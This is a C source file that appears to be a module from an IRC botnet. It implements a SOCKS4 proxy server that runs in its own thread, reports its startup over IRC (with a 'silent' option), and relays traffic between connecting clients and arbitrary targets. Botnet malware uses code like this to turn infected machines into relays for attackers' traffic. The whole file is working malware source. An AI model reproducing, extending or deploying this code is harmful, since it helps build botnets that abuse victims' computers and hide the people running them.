#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_SOCK4SERV

DWORD WINAPI SocksDaemon(LPVOID param)
{
	char sendbuf[IRCLINE];

	struct sockaddr_in info, client_in;
	SOCKET socks4sock, clientsock;
	DWORD lpThreadId;

	SOCKS4 socks4 = *((SOCKS4 *)param);
	SOCKS4 *socks4p = (SOCKS4 *)param;
	socks4p->gotinfo = TRUE;

	info.sin_family = AF_INET;
	info.sin_port = fhtons((unsigned short)socks4.port);
	info.sin_addr.s_addr = INADDR_ANY;

	socks4sock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fbind(socks4sock, (SOCKADDR *)&info, sizeof(info)) == 0) {
		threads[socks4.threadnum].sock=socks4sock;
	
		if (flisten(socks4sock, 10) == 0) {
			sprintf(sendbuf, "[SOCKS4]: Server started on Port %d.", socks4.port);
			if (!socks4.silent) irc_privmsg(socks4.sock, socks4.chan, sendbuf, socks4.notice);
			addlog(sendbuf);

			while (TRUE) {
				clientsock = faccept(socks4sock, (SOCKADDR *)&client_in, NULL);
				CreateThread(NULL, 0, &Socks4ClientThread, (LPVOID)clientsock, 0, &lpThreadId);
			}
		}
	}
	fclosesocket(socks4sock);

	sprintf(sendbuf, "[SOCKS4]: Failed to start server on Port %d.", socks4.port);
	if (!socks4.silent) irc_privmsg(socks4.sock, socks4.chan, sendbuf, socks4.notice);
	addlog(sendbuf);

	clearthread(socks4.threadnum);

	ExitThread(0);
}

DWORD WINAPI Socks4ClientThread(LPVOID pParam)
{
	struct SOCKS4HEADER hdr;
	SOCKET outbound,clientsock=(SOCKET)pParam;
	SOCKADDR_IN target_in;

	TIMEVAL timeout;
	timeout.tv_sec = 5;
	timeout.tv_usec = 0;
	fd_set fd;
	FD_ZERO(&fd);
	FD_SET(clientsock, &fd);

	if (fselect(0, &fd, NULL, NULL, &timeout) == 0) {
		fclosesocket(clientsock);
		ExitThread(0);
	}
	if (frecv(clientsock, (char *)&hdr, sizeof(hdr), 0) <= 0) {
		fclosesocket(clientsock);
		ExitThread(0);
	}
	if (hdr.vn != 4 || hdr.cd != SOCKS4_CONNECT) {
		fclosesocket(clientsock);
		ExitThread(0);
	}
	memset(&target_in, 0, sizeof(target_in));
	target_in.sin_family = AF_INET;
	target_in.sin_port = hdr.destport;
	target_in.sin_addr.s_addr = hdr.destaddr;
	outbound = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fconnect(outbound, (SOCKADDR *)&target_in, sizeof(target_in)) == SOCKET_ERROR) {
		hdr.vn = 0;
		hdr.cd = SOCKS4_REJECT;
		memset(&hdr.userid, 0, 1024);
		fsend(clientsock, (char *)&hdr, 8, 0);

		fclosesocket(clientsock);
		ExitThread(0);
	}
	hdr.vn = 0;
	hdr.cd = SOCKS4_GRANT;
	memset(&hdr.userid, 0, 1024);
	fsend(clientsock, (char *)&hdr, 8, 0);
	transfer_loop(outbound, clientsock);

	ExitThread(0);
}

void transfer_loop(SOCKET targetsock, SOCKET clientsock)
{
	int len;
	char buf[1024];
	fd_set fd;

	while (TRUE) {
		FD_ZERO(&fd);
		FD_SET(clientsock, &fd);
		FD_SET(targetsock, &fd);

		memset(buf, 0, sizeof(buf));
		fselect(0, &fd, NULL, NULL, NULL);

		if(fFD_ISSET(clientsock, &fd)) {
			if((len = frecv(clientsock,buf,sizeof(buf),0))== -1) break;
			if(fsend(targetsock,buf,len,0)== -1) break;
		}
	    if (fFD_ISSET(targetsock,&fd)) {
			if((len = frecv(targetsock,buf,sizeof(buf),0))== -1) break;
			if(fsend(clientsock,buf,len,0)== -1) break;
		}
	}

	return;
}
#endif
